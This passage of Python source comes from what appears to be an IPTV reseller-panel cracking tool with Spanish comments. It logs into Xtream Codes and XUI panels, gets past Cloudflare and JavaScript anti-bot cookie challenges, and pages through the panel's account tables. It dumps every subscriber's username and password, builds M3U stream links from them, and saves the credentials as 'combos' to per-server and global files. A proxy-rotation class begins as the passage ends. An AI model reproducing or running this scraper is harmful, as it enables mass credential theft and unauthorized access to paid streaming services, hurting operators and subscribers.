            open_conn_match = re.search(r'open\s+connections?[:\s]*([0-9.,]+)', content)
            if open_conn_match:
                self.reseller_info['open_connections'] = open_conn_match.group(1)

            online_match = re.search(r'online\s+users?[:\s]*([0-9.,]+)', content)
            if online_match:
                self.reseller_info['online_users'] = online_match.group(1)

        except Exception as e:
            self.log(f"⚠️ Error extrayendo info del reseller: {str(e)}", Fore.YELLOW)

    def verify_session_active(self):
        """Verifica si la sesión sigue activa accediendo a la página principal"""
        try:

            if self.panel_type == "XC":
                test_url = f"{self.base_url.rstrip('/')}/users.php"
            else:
                test_url = f"{self.base_url.rstrip('/')}/lines"

            response = None
            if self.flaresolverr_solution and self.flaresolverr_handler and self.flaresolverr_handler.available:
                print(f"{Fore.CYAN}[EXTRACTOR] 🔧 Usando FlareSolverr para verificar sesión...{Style.RESET_ALL}")
                flare_solution = self.cloudflare_detector.solve_with_flaresolverr(test_url)
                if flare_solution and flare_solution.get('success'):

                    self.flaresolverr_handler.apply_solution_to_session(self.session, flare_solution)

                    class FakeResponse:
                        def __init__(self, text, status_code, url):
                            self.text = text
                            self.status_code = status_code
                            self.url = url
                            self.content = text.encode('utf-8')
                    response = FakeResponse(flare_solution['html'], flare_solution['status_code'], test_url)
                    print(f"{Fore.GREEN}[EXTRACTOR] ✅ Sesión verificada con FlareSolverr{Style.RESET_ALL}")

            if not response:
                response = self.make_request_with_retry('GET', test_url, timeout=(10, 20), max_retries=2, verify=False, allow_redirects=True)

            if not response:
                print(f"{Fore.RED}[EXTRACTOR] ❌ No se pudo verificar sesión (sin respuesta){Style.RESET_ALL}")
                return False

            if 'login.php' in response.url.lower():
                print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ Sesión expirada (redirigido a login), intentando re-login...{Style.RESET_ALL}")

                login_result = self.login()
                if login_result:
                    print(f"{Fore.GREEN}[EXTRACTOR] ✅ Re-login exitoso{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.RED}[EXTRACTOR] ❌ Re-login falló{Style.RESET_ALL}")
                    return False

            if response.status_code == 200:

                if not self.host_m3u:
                    self.host_m3u = self.find_host_m3u(response.text)
                    if not self.host_m3u:
                        parsed = urlparse(self.url)
                        self.host_m3u = f"{parsed.scheme}://{parsed.netloc}"

                print(f"{Fore.GREEN}[EXTRACTOR] ✅ Sesión activa (acceso a {test_url}){Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[DEBUG] Cookies después de verify_session: {list(self.session.cookies)}{Style.RESET_ALL}")
                return True

            print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ Status inesperado: {response.status_code}, intentando re-login...{Style.RESET_ALL}")
            login_result = self.login()
            if login_result:
                print(f"{Fore.GREEN}[EXTRACTOR] ✅ Re-login exitoso{Style.RESET_ALL}")
                return True
            return False

        except Exception as e:

            print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ Error verificando sesión: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[EXTRACTOR] 🔄 Intentando re-login...{Style.RESET_ALL}")
            try:
                login_result = self.login()
                if login_result:
                    print(f"{Fore.GREEN}[EXTRACTOR] ✅ Re-login exitoso después de error{Style.RESET_ALL}")
                    return True
            except:
                pass
            return False

    def build_xui_params(self, draw, start, length):
        """Construye parámetros para tabla XUI con columnas completas"""
        params = {
            'draw': str(draw),
            'start': str(start),
            'length': str(length),
            'search[value]': '',
            'search[regex]': 'false',
            'id': 'lines',
            'filter': '1',
            'reseller': ''
        }

        columns = [
            'id', 'username', 'password', 'owner', 'status',
            'online', 'trial', 'active_conn', 'max_conn', 'expiry',
            'last_conn', 'actions'
        ]

        for i, col in enumerate(columns):
            params.update({
                f'columns[{i}][data]': str(i),
                f'columns[{i}][name]': col,
                f'columns[{i}][searchable]': 'true',
                f'columns[{i}][orderable]': 'true' if i < len(columns) - 1 else 'false',
                f'columns[{i}][search][value]': '',
                f'columns[{i}][search][regex]': 'false'
            })

        params['order[0][column]'] = '0'
        params['order[0][dir]'] = 'desc'

        return params

    def build_xc_params(self, draw, start, length):
        """Construye parámetros para tabla XC con columnas completas"""
        params = {
            'draw': str(draw),
            'start': str(start),
            'length': str(length),
            'search[value]': '',
            'search[regex]': 'false',
            'id': 'users',
            'filter': '1',
            'reseller': ''
        }

        columns = [
            'id', 'username', 'password', 'email', 'status',
            'active_cons', 'created_at', 'exp_date', 'max_connections',
            'reseller_id', 'enabled', 'actions'
        ]

        for i, col in enumerate(columns):
            params.update({
                f'columns[{i}][data]': str(i),
                f'columns[{i}][name]': col,
                f'columns[{i}][searchable]': 'true',
                f'columns[{i}][orderable]': 'true' if i < len(columns) - 1 else 'false',
                f'columns[{i}][search][value]': '',
                f'columns[{i}][search][regex]': 'false'
            })

        params['order[0][column]'] = '0'
        params['order[0][dir]'] = 'desc'

        return params

    def get_filtered_accounts_count_improved(self, table_type='users', retry_on_error=True):
        """Obtiene el conteo total de cuentas filtradas"""
        try:
            base_clean = self.base_url.rstrip('/') + '/'

            if table_type == 'lines':  
                table_url = f"{base_clean}table"
            else:  
                table_url = f"{base_clean}table_search.php"

            initial_params = {
                'draw': '1',
                'start': '0',
                'length': '1',  
                'search[value]': '',
                'search[regex]': 'false',
                'id': table_type,
                'filter': '1',
                'reseller': ''
            }

            for i in range(12):
                initial_params.update({
                    f'columns[{i}][data]': str(i),
                    f'columns[{i}][name]': '',
                    f'columns[{i}][searchable]': 'true',
                    f'columns[{i}][orderable]': 'true' if i < 11 else 'false',
                    f'columns[{i}][search][value]': '',
                    f'columns[{i}][search][regex]': 'false'
                })

            initial_params['order[0][column]'] = '0'
            initial_params['order[0][dir]'] = 'desc'

            user_agent = self.flaresolverr_user_agent if self.flaresolverr_user_agent else self.ua.random

            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "x-requested-with": "XMLHttpRequest",
                "referer": base_clean,
                "user-agent": user_agent
            }

            print(f"{Fore.YELLOW}[DEBUG] Cookies en sesión antes de table_search: {list(self.session.cookies)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[DEBUG] URL a llamar: {table_url}{Style.RESET_ALL}")

            response = self.make_request_with_retry(
                'GET', table_url,
                params=initial_params,
                headers=headers,
                max_retries=2,
                timeout=(8, 20),
                verify=False
            )

            if response and response.status_code == 200:

                if 'document.cookie' in response.text and 'window.location.reload' in response.text:
                    print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ Sistema anti-bot detectado, extrayendo cookie...{Style.RESET_ALL}")

                    cookie_match = re.search(r'document\.cookie\s*=\s*["\']([^;"\']+)', response.text)
                    if cookie_match:
                        cookie_str = cookie_match.group(1)

                        if '=' in cookie_str:
                            cookie_name, cookie_value = cookie_str.split('=', 1)

                            self.session.cookies.set(cookie_name.strip(), cookie_value.strip())
                            print(f"{Fore.GREEN}[EXTRACTOR] ✅ Cookie anti-bot establecida: {cookie_name}{Style.RESET_ALL}")

                            response = self.make_request_with_retry(
                                'GET', table_url,
                                params=initial_params,
                                headers=headers,
                                max_retries=2,
                                timeout=(8, 20),
                                verify=False
                            )
                            if not response or response.status_code != 200:
                                print(f"{Fore.RED}[EXTRACTOR] ❌ Reintento después de cookie anti-bot falló{Style.RESET_ALL}")
                                return 0

                try:
                    data = response.json()

                    filtered_count = data.get('recordsFiltered', data.get('recordsTotal', 0))

                    if isinstance(filtered_count, str):
                        clean_count = re.sub(r'[^\d]', '', filtered_count)
                        filtered_count = int(clean_count) if clean_count else 0
                    else:
                        filtered_count = int(filtered_count) if filtered_count else 0

                    total_count = data.get('recordsTotal', 0)
                    if isinstance(total_count, str):
                        clean_total = re.sub(r'[^\d]', '', total_count)
                        total_count = int(clean_total) if clean_total else 0
                    else:
                        total_count = int(total_count) if total_count else 0

                    print(f"{Fore.CYAN}[EXTRACTOR] Total registros: {total_count}, Filtrados: {filtered_count}{Style.RESET_ALL}")

                    if filtered_count == 0 and total_count > 0:
                        print(f"{Fore.YELLOW}[EXTRACTOR] Conteo filtrado es 0, usando total como fallback{Style.RESET_ALL}")
                        filtered_count = total_count

                    return filtered_count

                except (json.JSONDecodeError, ValueError, TypeError) as e:
                    error_msg = f"[EXTRACTOR] ❌ ERROR JSON al obtener conteo: {str(e)}"
                    print(f"{Fore.RED}{error_msg}{Style.RESET_ALL}")
                    logging.error(error_msg)
                    logging.error(f"[EXTRACTOR] Respuesta recibida (primeros 500 chars): {response.text[:500]}")
                    logging.error(f"[EXTRACTOR] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
                    logging.error(f"[EXTRACTOR] URL solicitada: {response.url}")

                    try:
                        with open('json_error_count_debug.txt', 'w', encoding='utf-8') as f:
                            f.write(f"Error decodificando JSON al obtener conteo\n")
                            f.write(f"Error: {str(e)}\n")
                            f.write(f"URL: {response.url}\n")
                            f.write(f"Status: {response.status_code}\n")
                            f.write(f"Content-Type: {response.headers.get('Content-Type', 'Unknown')}\n")
                            f.write(f"\n{'='*80}\n")
                            f.write(f"RESPUESTA COMPLETA:\n")
                            f.write(f"{'='*80}\n")
                            f.write(response.text)
                    except:
                        pass

                    print(f"{Fore.YELLOW}⚠️ Respuesta guardada en json_error_count_debug.txt para análisis{Style.RESET_ALL}")

                    if retry_on_error:
                        time.sleep(1)
                        return self.get_filtered_accounts_count_improved(table_type, retry_on_error=False)
                    return 0
            else:
                print(f"{Fore.RED}[EXTRACTOR] Error HTTP: {response.status_code if response else 'No response'}{Style.RESET_ALL}")
                if retry_on_error:
                    time.sleep(1)
                    return self.get_filtered_accounts_count_improved(table_type, retry_on_error=False)
                return 0

        except Exception as e:
            print(f"{Fore.RED}[EXTRACTOR] Error obteniendo conteo: {str(e)}{Style.RESET_ALL}")
            return 0

    def extract_batch_sync(self, batch_num, start_pos, length):
        """Extrae un lote específico de cuentas de forma síncrona"""
        try:
            base_clean = self.base_url.rstrip('/') + '/'

            if self.panel_type == 'XUI':
                url = f"{base_clean}table"
                params = self.build_xui_params(batch_num, start_pos, length)
            else:
                url = f"{base_clean}table_search.php"
                params = self.build_xc_params(batch_num, start_pos, length)

            user_agent = self.flaresolverr_user_agent if self.flaresolverr_user_agent else self.ua.random

            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "x-requested-with": "XMLHttpRequest",
                "referer": base_clean,
                "user-agent": user_agent
            }

            print(f"{Fore.CYAN}[EXTRACTOR] Solicitando lote {batch_num}: {start_pos}-{start_pos+length}{Style.RESET_ALL}")

            response = self.make_request_with_retry(
                'GET', url,
                params=params,
                headers=headers,
                max_retries=2,
                timeout=(10, 30)
            )

            if not response or response.status_code != 200:
                error_msg = f"[EXTRACTOR] Error HTTP en lote {batch_num}: {response.status_code if response else 'No response'}"
                print(f"{Fore.RED}{error_msg}{Style.RESET_ALL}")
                logging.error(error_msg)
                return []

            if 'document.cookie' in response.text and 'window.location.reload' in response.text:
                print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ Sistema anti-bot detectado en lote {batch_num}, extrayendo cookie...{Style.RESET_ALL}")
                cookie_match = re.search(r'document\.cookie\s*=\s*["\']([^;"\']+)', response.text)
                if cookie_match:
                    cookie_str = cookie_match.group(1)
                    if '=' in cookie_str:
                        cookie_name, cookie_value = cookie_str.split('=', 1)
                        self.session.cookies.set(cookie_name.strip(), cookie_value.strip())
                        print(f"{Fore.GREEN}[EXTRACTOR] ✅ Cookie anti-bot establecida, reintentando lote {batch_num}...{Style.RESET_ALL}")

                        response = self.make_request_with_retry(
                            'GET', url,
                            params=params,
                            headers=headers,
                            max_retries=2,
                            timeout=(10, 30)
                        )
                        if not response or response.status_code != 200:
                            print(f"{Fore.RED}[EXTRACTOR] ❌ Reintento de lote {batch_num} falló después de cookie{Style.RESET_ALL}")
                            return []

            try:
                data = response.json()
            except json.JSONDecodeError as e:
                error_msg = f"[EXTRACTOR] ❌ ERROR JSON en lote {batch_num}: {str(e)}"
                print(f"{Fore.RED}{error_msg}{Style.RESET_ALL}")
                logging.error(error_msg)
                logging.error(f"[EXTRACTOR] Respuesta recibida (primeros 500 chars): {response.text[:500]}")
                logging.error(f"[EXTRACTOR] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
                logging.error(f"[EXTRACTOR] URL solicitada: {response.url}")

                try:
                    with open('json_error_debug.txt', 'w', encoding='utf-8') as f:
                        f.write(f"Error decodificando JSON en lote {batch_num}\n")
                        f.write(f"Error: {str(e)}\n")
                        f.write(f"URL: {response.url}\n")
                        f.write(f"Status: {response.status_code}\n")
                        f.write(f"Content-Type: {response.headers.get('Content-Type', 'Unknown')}\n")
                        f.write(f"\n{'='*80}\n")
                        f.write(f"RESPUESTA COMPLETA:\n")
                        f.write(f"{'='*80}\n")
                        f.write(response.text)
                except:
                    pass

                print(f"{Fore.YELLOW}⚠️ Respuesta guardada en json_error_debug.txt para análisis{Style.RESET_ALL}")
                return []

            accounts = []
            if 'data' in data and data['data']:
                for row_idx, row in enumerate(data['data']):
                    try:

                        original_verbose = self.verbose
                        if batch_num == 1 and row_idx == 0:
                            self.verbose = True

                        if self.panel_type == 'XUI':
                            account = self.parse_xui_row(row)
                        else:
                            account = self.parse_xc_row(row)

                        self.verbose = original_verbose

                        if account:
                            accounts.append(account)

                    except Exception as e:
                        self.verbose = original_verbose
                        continue
            else:
                print(f"{Fore.YELLOW}[EXTRACTOR] Lote {batch_num}: Sin datos en respuesta{Style.RESET_ALL}")

            return accounts

        except Exception as e:
            print(f"{Fore.RED}[EXTRACTOR] Error en lote {batch_num}: {str(e)}{Style.RESET_ALL}")
            return []

    def get_host_m3u_sync(self):
        """Obtiene host M3U de forma síncrona"""
        try:
            if self.panel_type == "XC":
                main_url = f"{self.base_url.rstrip('/')}/users.php"
            else:
                main_url = f"{self.base_url.rstrip('/')}/lines"

            response = self.make_request_with_retry('GET', main_url, max_retries=2, timeout=(8, 15))

            if response and response.status_code == 200:
                self.host_m3u = self.find_host_m3u(response.text)
                if not self.host_m3u:
                    parsed = urlparse(self.url)
                    self.host_m3u = f"{parsed.scheme}://{parsed.netloc}"
                    print(f"{Fore.GREEN}[EXTRACTOR] Host M3U (fallback): {self.host_m3u}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[EXTRACTOR] Host M3U encontrado: {self.host_m3u}{Style.RESET_ALL}")
            else:
                parsed = urlparse(self.url)
                self.host_m3u = f"{parsed.scheme}://{parsed.netloc}"
                print(f"{Fore.YELLOW}[EXTRACTOR] Usando host fallback: {self.host_m3u}{Style.RESET_ALL}")

        except Exception as e:
            parsed = urlparse(self.url)
            self.host_m3u = f"{parsed.scheme}://{parsed.netloc}"
            print(f"{Fore.YELLOW}[EXTRACTOR] Error obteniendo host M3U: {str(e)}{Style.RESET_ALL}")

    def extract_accounts(self):
        """Método principal de extracción de cuentas - MEJORADO"""
        try:
            print(f"{Fore.CYAN}[EXTRACTOR] 🚀 Iniciando extracción de cuentas...{Style.RESET_ALL}")

            if not self.verify_session_active():
                print(f"{Fore.RED}[EXTRACTOR] ❌ No se pudo verificar/restaurar sesión{Style.RESET_ALL}")
                return None

            table_type = 'lines' if self.panel_type == 'XUI' else 'users'

            if not self.host_m3u:
                self.get_host_m3u_sync()

            if not self.host_m3u:
                print(f"{Fore.RED}[EXTRACTOR] ❌ No se pudo obtener host M3U{Style.RESET_ALL}")
                return None

            total_count = self.get_filtered_accounts_count_improved(table_type)

            if total_count == 0:
                print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ No se encontraron registros para extraer{Style.RESET_ALL}")
                return None

            print(f"{Fore.CYAN}[EXTRACTOR] 📊 Total de registros a extraer: {total_count}{Style.RESET_ALL}")

            batch_size = 100
            batches = []
            for start in range(0, total_count, batch_size):
                end = min(start + batch_size, total_count)
                batches.append((start, end - start))

            print(f"{Fore.CYAN}[EXTRACTOR] 📦 Procesando {len(batches)} lotes de {batch_size} registros{Style.RESET_ALL}")

            all_accounts = []

            for i, (start_pos, length) in enumerate(batches):
                try:
                    batch_accounts = self.extract_batch_sync(i+1, start_pos, length)

                    if batch_accounts:
                        all_accounts.extend(batch_accounts)
                        print(f"{Fore.GREEN}[EXTRACTOR] ✅ Lote {i+1}/{len(batches)}: {len(batch_accounts)} cuentas extraídas{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ Lote {i+1}/{len(batches)}: Sin cuentas válidas{Style.RESET_ALL}")

                    if i < len(batches) - 1:
                        time.sleep(1)

                except Exception as e:
                    print(f"{Fore.RED}[EXTRACTOR] ❌ Error en lote {i+1}: {str(e)}{Style.RESET_ALL}")
                    continue

            if all_accounts:
                print(f"{Fore.GREEN}[EXTRACTOR] ✅ Extracción completada: {len(all_accounts)} cuentas totales{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[EXTRACTOR] ⚠️ No se extrajeron cuentas válidas{Style.RESET_ALL}")

            self._cleanup_flaresolverr_session()

            return all_accounts if all_accounts else None

        except Exception as e:
            print(f"{Fore.RED}[EXTRACTOR] ❌ Error en extracción: {str(e)}{Style.RESET_ALL}")

            self._cleanup_flaresolverr_session()
            return None

    def parse_xc_row(self, row):
        """Parsea una fila de datos XC - CON DETECCIÓN DE SERVIDOR VIEJO/NUEVO"""
        try:
            if len(row) < 7:
                return None

            if self.verbose:
                print(f"{Fore.CYAN}[DEBUG XC] Row completo ({len(row)} elementos): {row}{Style.RESET_ALL}")

            is_old_server = len(row) > 7 and isinstance(row[7], str) and "Days" in str(row[7])

            account_id = self.clean_html_content(row[0]) or str(row[0])
            username = self.clean_html_content(row[1]) or str(row[1])
            password = self.clean_html_content(row[2]) or str(row[2])

            if not username or not password or len(username) < 2 or len(password) < 2:
                return None

            if is_old_server:

                if self.verbose:
                    print(f"{Fore.CYAN}[DEBUG XC] Servidor VIEJO detectado (Days en row[7]){Style.RESET_ALL}")

                status = "Active" if "btn-success" in str(row[4]) else "Inactive"
                expiry_raw = str(row[6])

                conn_text = self.clean_html_content(row[8]) if len(row) > 8 else "0/1"
                if "/" in str(conn_text):
                    conn_parts = str(conn_text).split("/")
                    active_cons = conn_parts[0].strip()
                    max_cons = conn_parts[1].strip()
                else:
                    active_cons = "0"
                    max_cons = "1"

                if self.verbose:
                    print(f"{Fore.YELLOW}[DEBUG XC] conn_text: {conn_text} -> active: {active_cons}, max: {max_cons}{Style.RESET_ALL}")
            else:

                if self.verbose:
                    print(f"{Fore.CYAN}[DEBUG XC] Servidor NUEVO detectado{Style.RESET_ALL}")

                status = "Active" if "text-success" in str(row[4]) or "btn-success" in str(row[4]) else "Inactive"
                expiry_raw = str(row[7])

                active_cons = self.clean_html_content(row[8]) if len(row) > 8 else "0"
                max_cons = self.clean_html_content(row[9]) if len(row) > 9 else "1"

                if self.verbose:
                    print(f"{Fore.YELLOW}[DEBUG XC] row[8]: {row[8]} -> active: {active_cons}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[DEBUG XC] row[9]: {row[9]} -> max: {max_cons}{Style.RESET_ALL}")

            expires = self.clean_html_content(expiry_raw) or "Unknown"

            m3u_url = f"{self.host_m3u}/get.php?username={username}&password={password}&type=m3u_plus"

            account = {
                'id': account_id,
                'username': username,
                'password': password,
                'status': status,
                'active_cons': active_cons,
                'expires': expires,
                'max_cons': max_cons,
                'm3u': m3u_url
            }

            return account

        except Exception as e:
            self.log(f"❌ Error parseando fila XC: {str(e)}", Fore.RED)
            return None

    def parse_xui_row(self, row):
        """Parsea una fila de datos XUI"""
        try:
            if len(row) < 7:
                return None

            if self.verbose:
                print(f"{Fore.CYAN}[DEBUG XUI] Row completo ({len(row)} elementos): {row}{Style.RESET_ALL}")

            account_id = self.clean_html_content(row[0]) or str(row[0])
            username = self.clean_html_content(row[1]) or str(row[1])
            password = self.clean_html_content(row[2]) or str(row[2])

            if not username or not password or len(username) < 2 or len(password) < 2:
                return None

            status_raw = str(row[4])
            status = "Active" if "text-success" in status_raw else "Inactive"

            online_raw = str(row[5])
            online = "Yes" if "text-success" in online_raw else "No"

            active_cons_raw = str(row[7]) if len(row) > 7 else "0"
            active_cons = self.clean_html_content(active_cons_raw, extract_numbers_only=True) or "0"

            if self.verbose:
                print(f"{Fore.YELLOW}[DEBUG XUI] active_cons_raw: {active_cons_raw} -> active_cons: {active_cons}{Style.RESET_ALL}")

            max_cons_raw = str(row[8]) if len(row) > 8 else "1"
            max_cons = self.clean_html_content(max_cons_raw, extract_numbers_only=True) or "1"

            if self.verbose:
                print(f"{Fore.YELLOW}[DEBUG XUI] max_cons_raw: {max_cons_raw} -> max_cons: {max_cons}{Style.RESET_ALL}")

            expiry_raw = str(row[9]) if len(row) > 9 else str(row[6])
            expires = self.clean_html_content(expiry_raw) or "Unknown"

            m3u_url = f"{self.host_m3u}/get.php?username={username}&password={password}&type=m3u_plus"

            account = {
                'id': account_id,
                'username': username,
                'password': password,
                'status': status,
                'online': online,
                'active_cons': active_cons,
                'max_cons': max_cons,
                'expires': expires,
                'm3u': m3u_url
            }

            return account

        except Exception as e:
            self.log(f"❌ Error parseando fila XUI: {str(e)}", Fore.RED)
            return None

    def clean_html_content(self, content, extract_numbers_only=False):
        """Limpia contenido HTML y extrae texto plano"""
        try:
            if content is None or str(content).lower() in ['null', 'none', '']:
                return None

            content_str = str(content)

            if '<' in content_str and '>' in content_str:
                content_str = content_str.replace('<br/>', ' ').replace('<br>', ' ')
                soup = BeautifulSoup(content_str, 'html.parser')
                clean_text = soup.get_text(strip=True)
            else:
                clean_text = content_str.strip()

            if extract_numbers_only:
                import re

                numbers = re.findall(r'\d+', clean_text)
                if numbers:
                    return numbers[0]
                return "0"

            if len(clean_text) < 1 or clean_text.lower() in ['null', 'none', '']:
                return None

            return clean_text

        except Exception as e:
            self.log(f"⚠️ Error limpiando HTML: {str(e)}", Fore.YELLOW)
            return str(content).strip() if content else None

    def clean_and_validate_m3u_url(self, url):
        """Limpia la URL de M3U encontrada (elimina doble protocolo)"""
        try:
            if not url:
                return url

            url = re.sub(r'https?://(https?://)', r'\1', url)

            return url

        except Exception as e:
            self.log(f"⚠️ Error limpiando URL M3U: {str(e)}", Fore.YELLOW)
            return url

    def find_host_m3u(self, response_text):
        """Encuentra la URL del host M3U en la respuesta HTML"""
        try:
            if self.panel_type == "XUI":
                patterns = [
                    r'rText = \"(.*?)/playlist',
                    r'href="(.*?)/playlist',
                    r'baseUrl\s*=\s*[\'"]([^\'"]+)[\'"]',
                    r'url\s*:\s*[\'"]([^\'"]+)[\'"].*?get.php',
                    r'let\s+server\s*=\s*[\'"]([^\'"]+)[\'"]'
                ]
            else:
                patterns = [
                    r'rText = \"(.*?)/get.php',
                    r'href="(.*?)/get.php',
                    r'baseUrl\s*=\s*[\'"]([^\'"]+)[\'"]',
                    r'url\s*:\s*[\'"]([^\'"]+)[\'"].*?get.php',
                    r'let\s+server\s*=\s*[\'"]([^\'"]+)[\'"]'
                ]

            for pattern in patterns:
                match = re.search(pattern, response_text)
                if match:
                    found_url = match.group(1)

                    cleaned_url = self.clean_and_validate_m3u_url(found_url)
                    self.log(f"✅ Host M3U encontrado: {cleaned_url}", Fore.GREEN)
                    return cleaned_url

            general_url_pattern = r'https?://[^\s\'"\)]+(?:get\.php|player_api\.php)'
            match = re.search(general_url_pattern, response_text)
            if match:
                url = match.group(0)
                base_url = url.split('/get.php')[0] if '/get.php' in url else url.split('/player_api.php')[0]

                cleaned_url = self.clean_and_validate_m3u_url(base_url)
                self.log(f"✅ Host M3U encontrado (general): {cleaned_url}", Fore.GREEN)
                return cleaned_url

            parsed = urlparse(self.url)
            fallback_url = f"{parsed.scheme}://{parsed.netloc}"
            self.log(f"⚠️ Usando host fallback para M3U: {fallback_url}", Fore.YELLOW)
            return fallback_url

        except Exception as e:
            self.log(f"⚠️ Error en búsqueda de host M3U: {str(e)}", Fore.YELLOW)
            parsed = urlparse(self.url)
            return f"{parsed.scheme}://{parsed.netloc}"

    def save_accounts(self, accounts, username, password):
        """Guarda las cuentas extraídas"""
        if not accounts:
            self.log("⚠️ No hay cuentas para guardar", Fore.YELLOW)
            return None

        try:

            server_name = self.normalize_server_name(f"{self.base_url}")
            safe_username = self.sanitize_filename(username)

            base_dir = 'hits_paneles'
            server_folder = os.path.join(base_dir, server_name)
            accounts_subfolder = os.path.join(server_folder, f"cuentas_extraidas_{server_name}")
            os.makedirs(accounts_subfolder, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"cuentas_{server_name}_{safe_username}_{timestamp}.txt"
            accounts_file = os.path.join(accounts_subfolder, filename)

            with open(accounts_file, 'w', encoding='utf-8') as f:
                f.write(f"# CUENTAS EXTRAÍDAS - {self.host}\n")
                f.write(f"# Generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Panel: {self.panel_type}\n")
                f.write(f"# Login: {username}:{password}\n")
                f.write(f"# Total cuentas: {len(accounts)}\n")
                f.write("=" * 50 + "\n\n")

                for i, account in enumerate(accounts, 1):
                    f.write(f"CUENTA #{i:03d}\n")
                    f.write(f"Username: {account.get('username', 'N/A')}\n")
                    f.write(f"Password: {account.get('password', 'N/A')}\n")
                    f.write(f"Status: {account.get('status', 'N/A')}\n")
                    f.write(f"Expires: {account.get('expires', 'N/A')}\n")
                    f.write(f"M3U: {account.get('m3u', 'N/A')}\n")
                    f.write("-" * 30 + "\n")

                    acc_username = account.get('username', '')
                    acc_password = account.get('password', '')
                    m3u_url = account.get('m3u', '')

                    if acc_username and acc_password:
                        self.save_combo_to_file(acc_username, acc_password, server_name)

                    if m3u_url and m3u_url != 'N/A':
                        self.save_m3u_to_lista(m3u_url, server_name)

            print(f"{Fore.GREEN}💾 Archivo guardado: {accounts_file}{Style.RESET_ALL}")
            self.log(f"✅ Cuentas guardadas en: {accounts_file}", Fore.GREEN)
            return accounts_file

        except Exception as e:
            self.log(f"❌ Error guardando cuentas: {str(e)}", Fore.RED)
            return None

    def sanitize_filename(self, filename):
        """Sanitiza nombres de archivo - VERSIÓN CORREGIDA"""
        if not filename:
            return "unknown"

        invalid_chars = r'<>:"/\|?*[]{}()!@#$%^&+=~`'

        for char in invalid_chars:
            filename = filename.replace(char, '_')

        filename = re.sub(r'[^\w\-_.]', '_', filename)
        filename = re.sub(r'_+', '_', filename)  
        filename = filename.strip('_.')

        if len(filename) > 50:
            filename = filename[:50]

        if not filename or filename == '_':
            filename = "unnamed"

        return filename

    def normalize_server_name(self, url):
        """Normaliza nombre de servidor para evitar carpetas duplicadas"""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)

            hostname = parsed.hostname or parsed.netloc.split(':')[0]
            port = parsed.port

            if not port and ':' in parsed.netloc:
                try:
                    port = int(parsed.netloc.split(':')[1])
                except:
                    port = None

            normalized_hostname = hostname.replace('.', '_')

            if port:
                server_name = f"{normalized_hostname}_{port}"
            else:
                server_name = normalized_hostname

            return server_name
        except Exception as e:
            logging.error(f"Error normalizando nombre de servidor: {e}")

            return self.sanitize_filename(urlparse(url).netloc)

    def append_to_file_no_duplicates(self, filepath, content):
        """Agrega contenido a un archivo evitando duplicados"""
        try:

            existing_lines = set()
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    existing_lines = set(line.strip() for line in f if line.strip())

            if content.strip() in existing_lines:
                return False

            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(content.strip() + '\n')

            return True
        except Exception as e:
            logging.error(f"Error agregando a archivo {filepath}: {e}")
            return False

    def save_m3u_to_lista(self, m3u_url, server_name):
        """Guarda URL M3U en el archivo de listas del servidor y en el global"""
        try:

            server_folder = f"hits_paneles/{server_name}"
            os.makedirs(server_folder, exist_ok=True)
            server_lista_file = f"{server_folder}/listas_{server_name}.txt"

            global_folder = "hits_paneles"
            os.makedirs(global_folder, exist_ok=True)
            global_lista_file = f"{global_folder}/listas_extraidas.txt"

            saved_server = self.append_to_file_no_duplicates(server_lista_file, m3u_url)

            saved_global = self.append_to_file_no_duplicates(global_lista_file, m3u_url)

            if saved_server:
                logging.info(f"M3U guardado en lista del servidor: {server_lista_file}")
            if saved_global:
                logging.info(f"M3U guardado en lista global: {global_lista_file}")

            return saved_server or saved_global
        except Exception as e:
            logging.error(f"Error guardando M3U en lista: {e}")
            return False

    def save_combo_to_file(self, username, password, server_name):
        """Guarda combo en el archivo de combos del servidor y en el global"""
        try:
            combo = f"{username}:{password}"

            server_folder = f"hits_paneles/{server_name}"
            os.makedirs(server_folder, exist_ok=True)
            server_combo_file = f"{server_folder}/combos_{server_name}.txt"

            global_folder = "hits_paneles"
            os.makedirs(global_folder, exist_ok=True)
            global_combo_file = f"{global_folder}/combos_extraidos.txt"

            saved_server = self.append_to_file_no_duplicates(server_combo_file, combo)

            saved_global = self.append_to_file_no_duplicates(global_combo_file, combo)

            if saved_server:
                logging.info(f"Combo guardado en archivo del servidor: {server_combo_file}")
            if saved_global:
                logging.info(f"Combo guardado en archivo global: {global_combo_file}")

            return saved_server or saved_global
        except Exception as e:
            logging.error(f"Error guardando combo: {e}")
            return False

class ScannerProxies:
    HTTP = 1
    SOCKS4 = 2
    SOCKS5 = 3    
    IPVANISH = 4
    HTTP_AUTH = 5

    def __init__(self):
        self.proxiesFile = ""
        self.proxiesList = []
        self.validProxies = []
        self.totalProxies = 0

        self.auth_proxies = []
        self.proxy_auth_format = False

        self.lastGivenProxy = 0
        self.httpProxy = "http:socks5"
        self.httsProxyType = ""
        self.proxyType = 0
        self.lock = threading.Lock()
        self.useProxies = False
        self.test_url = "http://ip-api.com/json/"
        self.timeout = 5
        self.max_threads = 50
        self.proxy_uses = {}
        self.min_proxies_required = 3

    def detect_proxy_format(self, proxy_line):
        """Detecta el formato del proxy"""
        try:
            parts = proxy_line.strip().split(':')

            if len(parts) == 4:
                host, port, username, password = parts
